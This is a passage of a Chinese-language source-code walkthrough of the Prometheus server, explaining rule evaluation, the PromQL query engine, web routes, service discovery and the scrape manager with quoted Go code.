g.seriesInPreviousEval[i] = from.seriesInPreviousEval[fi] ruleMap[rule.Name()] = indexes[1:] ar, ok := rule.(*AlertingRule) if !ok &#123; continue &#125; far, ok := from.rules[fi].(*AlertingRule) if !ok &#123; continue &#125; for fp, a := range far.active &#123; ar.active[fp] = a &#125; &#125;&#125; 规则组启动流程：进入 run 方法后先进行初始化等待，以使得规则运算的时间间隔interval对齐。定义规则运算调度方法iter, 调度收起interval指定；iter方法中调用eval方法。 123456789101112131415161718192021222324252627282930313233343536373839404142434445func (g *Group) run(ctx context.Context) &#123; defer close(g.terminated) // Wait an initial amount to have consistently slotted intervals. select &#123; case &lt;-time.After(g.offset()): case &lt;-g.done: return &#125; iter := func() &#123; iterationsScheduled.Inc() start := time.Now() g.Eval(ctx, start) iterationDuration.Observe(time.Since(start).Seconds()) g.SetEvaluationTime(time.Since(start)) &#125; lastTriggered := time.Now() iter() tick := time.NewTicker(g.interval) defer tick.Stop() for &#123; select &#123; case &lt;-g.done: return default: select &#123; case &lt;-g.done: return case &lt;-tick.C: missed := (time.Since(lastTriggered).Nanoseconds() / g.interval.Nanoseconds()) - 1 if missed &gt; 0 &#123; iterationsMissed.Add(float64(missed)) iterationsScheduled.Add(float64(missed)) &#125; lastTriggered = time.Now() iter() &#125; &#125; &#125;&#125; 规则组的调度在Eval中实现，Eval方法会将规则组中的每个规则一次放到queryEngine中执行，如果呗执行的规则是AlertingRule类型，执行后结果指标会通过notifier组件发送给告警服务，最后将结果指标存储到prometheus的存储管理器，并对过期指标进行存储标记处理。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788// Eval runs a single evaluation cycle in which all rules are evaluated sequentially.func (g *Group) Eval(ctx context.Context, ts time.Time) &#123; for i, rule := range g.rules &#123; select &#123; case &lt;-g.done: return default: &#125; func(i int, rule Rule) &#123; defer func(t time.Time) &#123; evalDuration.Observe(time.Since(t).Seconds()) rule.SetEvaluationTime(time.Since(t)) &#125;(time.Now()) evalTotal.Inc() vector, err := rule.Eval(ctx, ts, g.opts.QueryFunc, g.opts.ExternalURL) if err != nil &#123; // Canceled queries are intentional termination of queries. This normally // happens on shutdown and thus we skip logging of any errors here. if _, ok := err.(promql.ErrQueryCanceled); !ok &#123; level.Warn(g.logger).Log(\"msg\", \"Evaluating rule failed\", \"rule\", rule, \"err\", err) &#125; evalFailures.Inc() return &#125; if ar, ok := rule.(*AlertingRule); ok &#123; g.opts.NotifyFunc(ctx, ar.vector.String(), ar.currentAlerts()...) &#125; var ( numOutOfOrder = 0 numDuplicates = 0 ) app, err := g.opts.Appendable.Appender() if err != nil &#123; level.Warn(g.logger).Log(\"msg\", \"creating appender failed\", \"err\", err) return &#125; seriesReturned := make(map[string]labels.Labels, len(g.seriesInPreviousEval[i])) for _, s := range vector &#123; if _, err := app.Add(s.Metric, s.T, s.V); err != nil &#123; switch err &#123; case storage.ErrOutOfOrderSample: numOutOfOrder++ level.Debug(g.logger).Log(\"msg\", \"Rule evaluation result discarded\", \"err\", err, \"sample\", s) case storage.ErrDuplicateSampleForTimestamp: numDuplicates++ level.Debug(g.logger).Log(\"msg\", \"Rule evaluation result discarded\", \"err\", err, \"sample\", s) default: level.Warn(g.logger).Log(\"msg\", \"Rule evaluation result discarded\", \"err\", err, \"sample\", s) &#125; &#125; else &#123; seriesReturned[s.Metric.String()] = s.Metric &#125; &#125; if numOutOfOrder &gt; 0 &#123; level.Warn(g.logger).Log(\"msg\", \"Error on ingesting out-of-order result from rule evaluation\", \"numDropped\", numOutOfOrder) &#125; if numDuplicates &gt; 0 &#123; level.Warn(g.logger).Log(\"msg\", \"Error on ingesting results from rule evaluation with different value but same timestamp\", \"numDropped\", numDuplicates) &#125; for metric, lset := range g.seriesInPreviousEval[i] &#123; if _, ok := seriesReturned[metric]; !ok &#123; // Series no longer exposed, mark it stale. _, err = app.Add(lset, timestamp.FromTime(ts), math.Float64frombits(value.StaleNaN)) switch err &#123; case nil: case storage.ErrOutOfOrderSample, storage.ErrDuplicateSampleForTimestamp: // Do not count these in logging, as this is expected if series // is exposed from a different rule. default: level.Warn(g.logger).Log(\"msg\", \"adding stale sample failed\", \"sample\", metric, \"err\", err) &#125; &#125; &#125; if err := app.Commit(); err != nil &#123; level.Warn(g.logger).Log(\"msg\", \"rule sample appending failed\", \"err\", err) &#125; else &#123; g.seriesInPreviousEval[i] = seriesReturned &#125; &#125;(i, rule) &#125;&#125; 规则调度的流程： QueryEnginequeryengine是核心模块，规则分为告警规则和记录规则，告警规则会产生告警信息，通过通知组件发送给告警服务，告警规则的计算表达式可以引用记录规则。 Rule接口： 123456789101112131415// A Rule encapsulates a vector expression which is evaluated at a specified// interval and acted upon (currently either recorded or used for alerting).type Rule interface &#123; Name() string // eval evaluates the rule, including any associated recording or alerting actions. Eval(context.Context, time.Time, QueryFunc, *url.URL) (promql.Vector, error) // String returns a human-readable string representation of the rule. String() string SetEvaluationTime(time.Duration) GetEvaluationTime() time.Duration // HTMLSnippet returns a human-readable string representation of the rule, // decorated with HTML elements for use the web frontend. HTMLSnippet(pathPrefix string) html_template.HTML&#125; 两种规则都是通过实现Rule接口中的Eval方法来完成。 1）告警状态为StatePending时候，告警持续时间必须大于等于告警规则所配置的持续时间。 2）告警状态为StateFiring 告警规则和记录规则Eval方法的实现代码路径为rules/alerting和reording.go 查询引擎通过EngineQueryFunc方法完成了在RuleManager中的注册。 12// QueryFunc processes PromQL queries.type QueryFunc func(ctx context.Context, q string, t time.Time) (promql.Vector, error) 规则在查询引擎中运算之前，需要调用Engine.NewInstantQuery方法初始化，完成对规则的解析和对查询器的构建。 1234567891011// NewInstantQuery returns an evaluation query for the given expression at the given time.func (ng *Engine) NewInstantQuery(qs string, ts time.Time) (Query, error) &#123; expr, err := ParseExpr(qs) if err != nil &#123; return nil, err &#125; qry := ng.newQuery(expr, ts, ts, 0) qry.q = qs return qry, nil&#125; 规则允许的调用链为: query.Exec-&gt;Engine.exec-&gt;Engine.execEvalStmt-&gt;evaluator.eval。最为关键的部分在evaluator.eval方法中实现。 支持的表达式类型： 123456789AggregateExprBinaryExprCallMatrixSelectorNumberLiteralParenExprStringLiteralUnaryExprVectorSelector enginequery模块主要代码在promql目录下； ast.go定义查询引擎中常用的结构 engine.go具体实现 functions.go实现查询引擎的内置方法 fuzz.go，parse.go实现两种各不同的表达式解析器 printer.go, quantile.go, value.go 查询引擎的公共基础方法 BinaryExpr运算： 时间窗口规则运算： 规则计算和指标查询： 查询引擎在规则运算过程中，先对规则进行解析，然后解析后的规则转换成为对应类型的表达式，最后根据转换后的表达式和数据完成规则计算。 查询引擎是通过调用读写代理器fanoutStorage中的Querier方法获取指标数据的。 Querier方法的主要参数为指标名称，开始时间和结束时间。 加入指标查询后的规则运算调用链为： query.Exec=&gt;Engine.Exec=&gt;Engine.execEvalStat=&gt;Engine.populateIterators=&gt;Engine.queryable.Querier=&gt;evaluator.eval Webweb组件引用了localStorage组件，fanoutStorage组件，scrapeManager组件，ruleManager组件和notifier组件，对外提供http服务。 prometheus server服务的handler的数据结构如下： 12345678910111213141516171819202122232425262728293031// Handler serves various HTTP endpoints of the Prometheus servertype Handler struct &#123; logger log.Logger scrapeManager *retrieval.ScrapeManager ruleManager *rules.Manager queryEngine *promql.Engine context context.Context tsdb func() *tsdb.DB storage storage.Storage notifier *notifier.Notifier apiV1 *api_v1.API router *route.Router quitCh chan struct&#123;&#125; reloadCh chan chan error options *Options config *config.Config configString string versionInfo *PrometheusVersion birth time.Time cwd string flagsMap map[string]string externalLabels model.LabelSet mtx sync.RWMutex now func() model.Time ready uint32 // ready is uint32 rather than boolean to be able to use atomic functions.&#125; web初始化再main中： 1webHandler := web.New(log.With(logger, \"component\", \"web\"), &amp;cfg.web) 注册api接口： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124func New(logger log.Logger, o *Options) *Handler &#123; router := route.New() cwd, err := os.Getwd() if err != nil &#123; cwd = \"&lt;error retrieving current working directory&gt;\" &#125; if logger == nil &#123; logger = log.NewNopLogger() &#125; h := &amp;Handler&#123; logger: logger, router: router, quitCh: make(chan struct&#123;&#125;), reloadCh: make(chan chan error), options: o, versionInfo: o.Version, birth: time.Now(), cwd: cwd, flagsMap: o.Flags, context: o.Context, scrapeManager: o.ScrapeManager, ruleManager: o.RuleManager, queryEngine: o.QueryEngine, tsdb: o.TSDB, storage: o.Storage, notifier: o.Notifier, now: model.Now, ready: 0, &#125; h.apiV1 = api_v1.NewAPI(h.queryEngine, h.storage, h.scrapeManager, h.notifier, func() config.Config &#123; h.mtx.RLock() defer h.mtx.RUnlock() return *h.config &#125;, h.testReady, h.options.TSDB, h.options.EnableAdminAPI, ) if o.RoutePrefix != \"/\" &#123; // If the prefix is missing for the root path, prepend it. router.Get(\"/\", func(w http.ResponseWriter, r *http.Request) &#123; http.Redirect(w, r, o.RoutePrefix, http.StatusFound) &#125;) router = router.WithPrefix(o.RoutePrefix) &#125; instrh := prometheus.InstrumentHandler instrf := prometheus.InstrumentHandlerFunc readyf := h.testReady router.Get(\"/\", func(w http.ResponseWriter, r *http.Request) &#123; http.Redirect(w, r, path.Join(o.ExternalURL.Path, \"/graph\"), http.StatusFound) &#125;) router.Get(\"/alerts\", readyf(instrf(\"alerts\", h.alerts))) //alerts信息 router.Get(\"/graph\", readyf(instrf(\"graph\", h.graph))) //graph接口 router.Get(\"/status\", readyf(instrf(\"status\", h.status))) //status状态 router.Get(\"/flags\", readyf(instrf(\"flags\", h.flags))) router.Get(\"/config\", readyf(instrf(\"config\", h.serveConfig))) router.Get(\"/rules\", readyf(instrf(\"rules\", h.rules))) //rules router.Get(\"/targets\", readyf(instrf(\"targets\", h.targets))) // Bucket targets by job label router.Get(\"/version\", readyf(instrf(\"version\", h.version))) router.Get(\"/service-discovery\", readyf(instrf(\"servicediscovery\", h.serviceDiscovery))) //服务发现 router.Get(\"/heap\", instrf(\"heap\", h.dumpHeap)) router.Get(\"/metrics\", prometheus.Handler().ServeHTTP) //当前所有指标数据 router.Get(\"/federate\", readyf(instrh(\"federate\", httputil.CompressionHandler&#123; Handler: http.HandlerFunc(h.federation), &#125;))) router.Get(\"/consoles/*filepath\", readyf(instrf(\"consoles\", h.consoles))) router.Get(\"/static/*filepath\", instrf(\"static\", h.serveStaticAsset)) if o.UserAssetsPath != \"\" &#123; router.Get(\"/user/*filepath\", instrf(\"user\", route.FileServe(o.UserAssetsPath))) &#125; if o.EnableLifecycle &#123; router.Post(\"/-/quit\", h.quit) router.Post(\"/-/reload\", h.reload) &#125; else &#123; router.Post(\"/-/quit\", func(w http.ResponseWriter, _ *http.Request) &#123; w.WriteHeader(http.StatusForbidden) w.Write([]byte(\"Lifecycle APIs are not enabled\")) &#125;) router.Post(\"/-/reload\", func(w http.ResponseWriter, _ *http.Request) &#123; w.WriteHeader(http.StatusForbidden) w.Write([]byte(\"Lifecycle APIs are not enabled\")) &#125;) &#125; router.Get(\"/-/quit\", func(w http.ResponseWriter, _ *http.Request) &#123; w.WriteHeader(http.StatusMethodNotAllowed) w.Write([]byte(\"Only POST requests allowed\")) &#125;) router.Get(\"/-/reload\", func(w http.ResponseWriter, _ *http.Request) &#123; w.WriteHeader(http.StatusMethodNotAllowed) w.Write([]byte(\"Only POST requests allowed\")) &#125;) router.Get(\"/debug/*subpath\", serveDebug) router.Post(\"/debug/*subpath\", serveDebug) router.Get(\"/-/healthy\", func(w http.ResponseWriter, r *http.Request) &#123; w.WriteHeader(http.StatusOK) fmt.Fprintf(w, \"Prometheus is Healthy.\\n\") &#125;) router.Get(\"/-/ready\", readyf(func(w http.ResponseWriter, r *http.Request) &#123; w.WriteHeader(http.StatusOK) fmt.Fprintf(w, \"Prometheus is Ready.\\n\") &#125;)) return h&#125; reload接口调用发送信号给reloadCh，重新加载配置。web主要内容就这些。 DiscoveryManager数据采集之前，prometheus需要先发现数据采集的目标服务，然后从目标服务中获取指标数据，最后将指标数据存储到prometheus存储管理器中。 服务发现结构配置： 123456789101112131415161718192021222324252627282930313233// ServiceDiscoveryConfig configures lists of different service discovery mechanisms.type ServiceDiscoveryConfig struct &#123; // List of labeled target groups for this job. StaticConfigs []*targetgroup.Group `yaml:\"static_configs,omitempty\"` // List of DNS service discovery configurations. DNSSDConfigs []*dns.SDConfig `yaml:\"dns_sd_configs,omitempty\"` // List of file service discovery configurations. FileSDConfigs []*file.SDConfig `yaml:\"file_sd_configs,omitempty\"` // List of Consul service discovery configurations. ConsulSDConfigs []*consul.SDConfig `yaml:\"consul_sd_configs,omitempty\"` // List of Serverset service discovery configurations. ServersetSDConfigs []*zookeeper.ServersetSDConfig `yaml:\"serverset_sd_configs,omitempty\"` // NerveSDConfigs is a list of Nerve service discovery configurations. NerveSDConfigs []*zookeeper.NerveSDConfig `yaml:\"nerve_sd_configs,omitempty\"` // MarathonSDConfigs is a list of Marathon service discovery configurations. MarathonSDConfigs []*marathon.SDConfig `yaml:\"marathon_sd_configs,omitempty\"` // List of Kubernetes service discovery configurations. KubernetesSDConfigs []*kubernetes.SDConfig `yaml:\"kubernetes_sd_configs,omitempty\"` // List of GCE service discovery configurations. GCESDConfigs []*gce.SDConfig `yaml:\"gce_sd_configs,omitempty\"` // List of EC2 service discovery configurations. EC2SDConfigs []*ec2.SDConfig `yaml:\"ec2_sd_configs,omitempty\"` // List of OpenStack service discovery configurations. OpenstackSDConfigs []*openstack.SDConfig `yaml:\"openstack_sd_configs,omitempty\"` // List of Azure service discovery configurations. AzureSDConfigs []*azure.SDConfig `yaml:\"azure_sd_configs,omitempty\"` // List of Triton service discovery configurations. TritonSDConfigs []*triton.SDConfig `yaml:\"triton_sd_configs,omitempty\"` // Catches all undefined fields and must be empty after parsing. XXX map[string]interface&#123;&#125; `yaml:\",inline\"`&#125; prometheus支持以上服务，除了StaticConfigs静态服务配置，其他都是动态的服务配置。 对所有的服务发现，都提供一个抽象接口： 1234567type Discoverer interface &#123; // Run hands a channel to the discovery provider(consul,dns etc) through which it can send // updated target groups. // Must returns if the context gets canceled. It should not close the update // channel on returning. Run(ctx context.Context, up chan&lt;- []*targetgroup.Group)&#125; prometheus将所发现的服务都转换成为了targetGroup.Group结构，通过 up发送给ScrapeManager，完成服务上线。 代码路径：/discovery/targetgroup/targetgroup.go 1234567891011// Group is a set of targets with a common label set(production , test, staging etc.).type Group struct &#123; // Targets is a list of targets identified by a label set. Each target is // uniquely identifiable in the group by its address label. Targets []model.LabelSet // Labels is a set of labels that is common across all targets in the group. Labels model.LabelSet // Source is an identifier that describes a group of targets. Source string&#125; 服务发现管理者Manager是所有发现服务的入口，服务的上线，下线和更新都需要进行服务同步。 Manager的结构： 123456789101112131415/ Manager maintains a set of discovery providers and sends each update to a map channel.// Targets are grouped by the target set name.type Manager struct &#123; logger log.Logger //系统日志记录 mtx sync.RWMutex //同步读写锁 ctx context.Context //协同控制 discoverCancel []context.CancelFunc //服务下线调用 // Some Discoverers(eg. k8s) send only the updates for a given target group // so we use map[tg.Source]*targetgroup.Group to know which group to update. //发现的目标服务 targets map[poolKey]map[string]*targetgroup.Group // The sync channels sends the updates in map[targetSetName] where targetSetName is the job value from the scrape config. //将所发现的目标服务以chan的方式通知接受方 syncCh chan map[string][]*targetgroup.Group&#125; 在初始化的过程中给，构建discoveryManagerScrape，并通过调用applyConfig方法完成对Discoverer的构建。 1234567891011121314// ApplyConfig removes all running discovery providers and starts new ones using the provided config.func (m *Manager) ApplyConfig(cfg map[string]sd_config.ServiceDiscoveryConfig) error &#123; m.mtx.Lock() defer m.mtx.Unlock() m.cancelDiscoverers() for name, scfg := range cfg &#123; for provName, prov := range m.providersFromConfig(scfg) &#123; m.startProvider(m.ctx, poolKey&#123;setName: name, provider: provName&#125;, prov) &#125; &#125; return nil&#125; startProvider方法根据job_name，服务名称和具体的Discoverer实例启动所发现的scrape服务。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980func (m *Manager) providersFromConfig(cfg sd_config.ServiceDiscoveryConfig) map[string]Discoverer &#123; providers := map[string]Discoverer&#123;&#125; app := func(mech string, i int, tp Discoverer) &#123; providers[fmt.Sprintf(\"%s/%d\", mech, i)] = tp &#125; for i, c := range cfg.DNSSDConfigs &#123; app(\"dns\", i, dns.NewDiscovery(*c, log.With(m.logger, \"discovery\", \"dns\"))) &#125; for i, c := range cfg.FileSDConfigs &#123; app(\"file\", i, file.NewDiscovery(c, log.With(m.logger, \"discovery\", \"file\"))) &#125; for i, c := range cfg.ConsulSDConfigs &#123; k, err := consul.NewDiscovery(c, log.With(m.logger, \"discovery\", \"consul\")) if err != nil &#123; level.Error(m.logger).Log(\"msg\", \"Cannot create Consul discovery\", \"err\", err) continue &#125; app(\"consul\", i, k) &#125; for i, c := range cfg.MarathonSDConfigs &#123; t, err := marathon.NewDiscovery(*c, log.With(m.logger, \"discovery\", \"marathon\")) if err != nil &#123; level.Error(m.logger).Log(\"msg\", \"Cannot create Marathon discovery\", \"err\", err) continue &#125; app(\"marathon\", i, t) &#125; for i, c := range cfg.KubernetesSDConfigs &#123; k, err := kubernetes.New(log.With(m.logger, \"discovery\", \"k8s\"), c) if err != nil &#123; level.Error(m.logger).Log(\"msg\", \"Cannot create Kubernetes discovery\", \"err\", err) continue &#125; app(\"kubernetes\", i, k) &#125; for i, c := range cfg.ServersetSDConfigs &#123; app(\"serverset\", i, zookeeper.NewServersetDiscovery(c, log.With(m.logger, \"discovery\", \"zookeeper\"))) &#125; for i, c := range cfg.NerveSDConfigs &#123; app(\"nerve\", i, zookeeper.NewNerveDiscovery(c, log.With(m.logger, \"discovery\", \"nerve\"))) &#125; for i, c := range cfg.EC2SDConfigs &#123; app(\"ec2\", i, ec2.NewDiscovery(c, log.With(m.logger, \"discovery\", \"ec2\"))) &#125; for i, c := range cfg.OpenstackSDConfigs &#123; openstackd, err := openstack.NewDiscovery(c, log.With(m.logger, \"discovery\", \"openstack\")) if err != nil &#123; level.Error(m.logger).Log(\"msg\", \"Cannot initialize OpenStack discovery\", \"err\", err) continue &#125; app(\"openstack\", i, openstackd) &#125; for i, c := range cfg.GCESDConfigs &#123; gced, err := gce.NewDiscovery(*c, log.With(m.logger, \"discovery\", \"gce\")) if err != nil &#123; level.Error(m.logger).Log(\"msg\", \"Cannot initialize GCE discovery\", \"err\", err) continue &#125; app(\"gce\", i, gced) &#125; for i, c := range cfg.AzureSDConfigs &#123; app(\"azure\", i, azure.NewDiscovery(c, log.With(m.logger, \"discovery\", \"azure\"))) &#125; for i, c := range cfg.TritonSDConfigs &#123; t, err := triton.New(log.With(m.logger, \"discovery\", \"trition\"), c) if err != nil &#123; level.Error(m.logger).Log(\"msg\", \"Cannot create Triton discovery\", \"err\", err) continue &#125; app(\"triton\", i, t) &#125; if len(cfg.StaticConfigs) &gt; 0 &#123; app(\"static\", 0, NewStaticProvider(cfg.StaticConfigs)) &#125; return providers&#125; 调用startProvider启动服务： 1234567891011121314151617181920212223242526func (m *Manager) startProvider(ctx context.Context, poolKey poolKey, worker Discoverer) &#123; ctx, cancel := context.WithCancel(ctx) updates := make(chan []*targetgroup.Group) m.discoverCancel = append(m.discoverCancel, cancel) go worker.Run(ctx, updates) go m.runProvider(ctx, poolKey, updates)&#125;func (m *Manager) runProvider(ctx context.Context, poolKey poolKey, updates chan []*targetgroup.Group) &#123; for &#123; select &#123; case &lt;-ctx.Done(): return case tgs, ok := &lt;-updates: // Handle the case that a target provider exits and closes the channel // before the context is done. if !ok &#123; return &#125; m.updateGroup(poolKey, tgs) m.syncCh &lt;- m.allGroups() &#125; &#125;&#125; 各个服务在discovery目录中对应的服务启动。如DNS Discovery服务在完成启动之后，runProvider将接收更新之后的服务信息updates，并将新的服务信息通过updateGroup方法同步到targets列表，在调用allgroups方法完成对服务快照信息的构建，发送到指标的管理器中ScraperManager。 流程： ScrapeManagerscrapeManager组件的采集周期在prometheus.yml配置文件中由global节点下的scrape_interval指定，各个job_name可以在scrape_configs下进行个性化的设置，设置符合自身场景的scrape_interval 指标采集是指从发现的服务中定时获取指标数据。prometheus在启动的过程中会完成对scrapeManager的初始化，初始化过程包括构建scrapeManager实列，加载配置启动scrapeManager实例三个。scrapeManager复制维护scrapePool，并管理scrape组件的生命周期 ScrapeManager通过调用NewScrapeManager方法完成对scapeManager实例的创建。 12345678910// ScrapeManager maintains a set of scrape pools and manages start/stop cycles// when receiving new target groups form the discovery manager.type ScrapeManager struct &#123; logger log.Logger append Appendable //指标存储器 scrapeConfigs map[string]*config.ScrapeConfig //job_name scrape配置 scrapePools map[string]*scrapePool //job_name指标采集器 mtx sync.RWMutex //同步访问控制，读写锁 graceShut chan struct&#123;&#125; //scrapemanager关闭控制&#125; 初始化ScrapeManager结构; 1234567891011// NewScrapeManager is the ScrapeManager constructorfunc NewScrapeManager(logger log.Logger, app Appendable) *ScrapeManager &#123; return &amp;ScrapeManager&#123; append: app, logger: logger, scrapeConfigs: make(map[string]*config.ScrapeConfig), scrapePools: make(map[string]*scrapePool), graceShut: make(chan struct&#123;&#125;), &#125;&#125; scrapeManager的配置加载，是根据prometheus.yml中的scrape_configs配置项，对scrape服务进行配置更新处理，调用方法为ApplyConfig，器内部实现分初次加载和配置更新动态加载两种。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556// ScrapeConfig configures a scraping unit for Prometheus.type ScrapeConfig struct &#123; // The job name to which the job label is set by default. JobName string `yaml:\"job_name\"` // Indicator whether the scraped metrics should remain unmodified. HonorLabels bool `yaml:\"honor_labels,omitempty\"` // A set of query parameters with which the target is scraped. Params url.Values `yaml:\"params,omitempty\"` // How frequently to scrape the targets of this scrape config. ScrapeInterval model.Duration `yaml:\"scrape_interval,omitempty\"` // The timeout for scraping targets of this config. ScrapeTimeout model.Duration `yaml:\"scrape_timeout,omitempty\"` // The HTTP resource path on which to fetch metrics from targets. MetricsPath string `yaml:\"metrics_path,omitempty\"` // The URL scheme with which to fetch metrics from targets. Scheme string `yaml:\"scheme,omitempty\"` // More than this many samples post metric-relabelling will cause the scrape to fail. SampleLimit uint `yaml:\"sample_limit,omitempty\"` // We cannot do proper Go type embedding below as the parser will then parse // values arbitrarily into the overflow maps of further-down types. ServiceDiscoveryConfig sd_config.ServiceDiscoveryConfig `yaml:\",inline\"` HTTPClientConfig config_util.HTTPClientConfig `yaml:\",inline\"` // List of target relabel configurations. RelabelConfigs []*RelabelConfig `yaml:\"relabel_configs,omitempty\"` // List of metric relabel configurations. MetricRelabelConfigs []*RelabelConfig `yaml:\"metric_relabel_configs,omitempty\"` // Catches all undefined fields and must be empty after parsing. XXX map[string]interface&#123;&#125; `yaml:\",inline\"`&#125;// ApplyConfig resets the manager's target providers and job configurations as defined by the new cfg.func (m *ScrapeManager) ApplyConfig(cfg *config.Config) error &#123; m.mtx.Lock() defer m.mtx.Unlock() c := make(map[string]*config.ScrapeConfig) for _, scfg := range cfg.ScrapeConfigs &#123; c[scfg.JobName] = scfg &#125; m.scrapeConfigs = c // Cleanup and reload pool if config has changed. for name, sp := range m.scrapePools &#123; if cfg, ok := m.scrapeConfigs[name]; !ok &#123; sp.stop() delete(m.scrapePools, name) &#125; else if !reflect.DeepEqual(sp.config, cfg) &#123; sp.reload(cfg) &#125; &#125; return nil&#125; sp.reload方法将重新配置scrapePool，流程为： 构建scrapeLoop服务 停止线上所对应的scrapeLoop服务 启动新的scrapeLoop服务 以上三步动态更新； 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647// reload the scrape pool with the given scrape configuration. The target state is preserved// but all scrape loops are restarted with the new scrape configuration.// This method returns after all scrape loops that were stopped have stopped scraping.func (sp *scrapePool) reload(cfg *config.ScrapeConfig) &#123; start := time.Now() sp.mtx.Lock() defer sp.mtx.Unlock() client, err := httputil.NewClientFromConfig(cfg.HTTPClientConfig, cfg.JobName) if err != nil &#123; // Any errors that could occur here should be caught during config validation. level.Error(sp.logger).Log(\"msg\", \"Error creating HTTP client\", \"err\", err) &#125; sp.config = cfg sp.client = client var ( wg sync.WaitGroup interval = time.Duration(sp.config.ScrapeInterval) timeout = time.Duration(sp.config.ScrapeTimeout) ) for fp, oldLoop := range sp.loops &#123; var ( t = sp.targets[fp] s = &amp;targetScraper&#123;Target: t, client: sp.client, timeout: timeout&#125; newLoop = sp.newLoop(t, s) ) wg.Add(1) go func(oldLoop, newLoop loop) &#123; //停止线上的老的scrapeLoop服务 oldLoop.stop() wg.Done() //启动新的scrapeLoop服务 go newLoop.run(interval, timeout, nil) &#125;(oldLoop, newLoop) //更新scrapePool中的scrapeLoop服务 sp.loops[fp] = newLoop &#125; wg.Wait() //更新采集周期 targetReloadIntervalLength.WithLabelValues(interval.String()).Observe( time.Since(start).Seconds(), )&#125; 配置加载流程： ScrapeManager通过调用retrieval下的Manager.Run方法完成启动，其参数为prometheus.yml配置发现的目标服务，有discovery模块中的Manager.SyncCh 方法负责和ScrapeManager通信。 当SyncSh发生变化时，将触发ScrapeManager中的reload方法，在reload方法中会遍历目标服务，根据tsetName（jobName）从scrapePools中查找scrapePool，如果找不到则新建一个scrapePool，使得每个job都有一个对应的scrapePool 123456789101112// Run starts background processing to handle target updates and reload the scraping loops.func (m *ScrapeManager) Run(tsets &lt;-chan map[string][]*targetgroup.Group) error &#123; level.Info(m.logger).Log(\"msg\", \"Starting scrape manager...\") for &#123; select &#123; case ts := &lt;-tsets: m.reload(ts) case &lt;-m.graceShut: return nil &#125; &#125; 123456789101112131415161718192021func (m *ScrapeManager) reload(t map[string][]*targetgroup.Group) &#123; for tsetName, tgroup := range t &#123; scrapeConfig, ok := m.scrapeConfigs[tsetName] if !ok &#123; level.Error(m.logger).Log(\"msg\", \"error reloading target set\", \"err\", fmt.Sprintf(\"invalid config id:%v\", tsetName)) continue &#125; //检查ScrapePool中服务是否存在，不存在构建新的ScrapePool // Scrape pool doesn't exist so start a new one. existing, ok := m.scrapePools[tsetName] if !ok &#123; sp := newScrapePool(scrapeConfig, m.append, log.With(m.logger, \"scrape_pool\", tsetName)) m.scrapePools[tsetName] = sp sp.Sync(tgroup) //调用Sync方法同步目标服务和启动scrape &#125; else &#123; //同步目标服务并启动scrape existing.Sync(tgroup) &#125; &#125;&#125; sp.Sync方法主要用于将tgroup转换为Target类型，再调用scrapePool.sync方法同步scrape服务。 ScrapePool主要管理目标服务和scrapeLoop Sync方法具体实现： 12345678910111213141516171819202122232425262728293031323334// Sync converts target groups into actual scrape targets and synchronizes// the currently running scraper with the resulting set.func (sp *scrapePool) Sync(tgs []*targetgroup.Group) &#123; start := time.Now() var all []*Target sp.mtx.Lock() sp.droppedTargets = []*Target&#123;&#125; for _, tg := range tgs &#123; //Group转换成target targets, err := targetsFromGroup(tg, sp.config) if err != nil &#123; level.Error(sp.logger).Log(\"msg\", \"creating targets failed\", \"err\", err) continue &#125; for _, t := range targets &#123; //检查Target是否存在有有效的Label if t.Labels().Len() &gt; 0 &#123; all = append(all, t) //记录无效的Target &#125; else if t.DiscoveredLabels().Len() &gt; 0 &#123; sp.droppedTargets = append(sp.droppedTargets, t) &#125; &#125; &#125; sp.mtx.Unlock() //同步scrape服务 sp.sync(all)//更新系统指标 targetSyncIntervalLength.WithLabelValues(sp.config.JobName).Observe( time.Since(start).Seconds(), ) targetScrapePoolSyncsCounter.WithLabelValues(sp.config.JobName).Inc()&#125; scrapePool.sync方法将输入参数targets与原有的targets列表sp.targets进行对比，如果有新的target加入，就创建新的targetScraper和scrapeLoop，并且启动新的scrapeLoop，如果发现已经失效的target,就会停止scrapeLoop服务并删除对应的target和scrapeLoop 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051// sync takes a list of potentially duplicated targets, deduplicates them, starts// scrape loops for new targets, and stops scrape loops for disappeared targets.// It returns after all stopped scrape loops terminated.func (sp *scrapePool) sync(targets []*Target) &#123; sp.mtx.Lock() defer sp.mtx.Unlock() var ( uniqueTargets = map[uint64]struct&#123;&#125;&#123;&#125; interval = time.Duration(sp.config.ScrapeInterval) timeout = time.Duration(sp.config.ScrapeTimeout) ) for _, t := range targets &#123; t := t hash := t.hash() uniqueTargets[hash] = struct&#123;&#125;&#123;&#125; if _, ok := sp.targets[hash]; !ok &#123; s := &amp;targetScraper&#123;Target: t, client: sp.client, timeout: timeout&#125; l := sp.newLoop(t, s) sp.targets[hash] = t sp.loops[hash] = l go l.run(interval, timeout, nil) &#125; &#125; var wg sync.WaitGroup // Stop and remove old targets and scraper loops. for hash := range sp.targets &#123; if _, ok := uniqueTargets[hash]; !ok &#123; wg.Add(1) go func(l loop) &#123; l.stop() wg.Done() &#125;(sp.loops[hash]) delete(sp.loops, hash) delete(sp.targets, hash) &#125; &#125; // Wait for all potentially stopped scrapers to terminate. // This covers the case of flapping targets. If the server is under high load, a new scraper // may be active and tries to insert. The old scraper that didn't terminate yet could still // be inserting a previous sample set. wg.Wait()&#125; scrapeLoop是scrape的直接管理者，每个scrapeLoop都通过一个goroutine来运行，scrapeLoop控制scrape进行指标的拉取 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899func (sl *scrapeLoop) run(interval, timeout time.Duration, errc chan&lt;- error) &#123; select &#123; case &lt;-time.After(sl.scraper.offset(interval)): // Continue after a scraping offset. case &lt;-sl.scrapeCtx.Done(): close(sl.stopped) return &#125; var last time.Time ticker := time.NewTicker(interval) defer ticker.Stop() //初始化指标存储空间 buf := bytes.NewBuffer(make([]byte, 0, 16000))mainLoop: for &#123; buf.Reset() select &#123; //停止scrapeLoop case &lt;-sl.ctx.Done(): 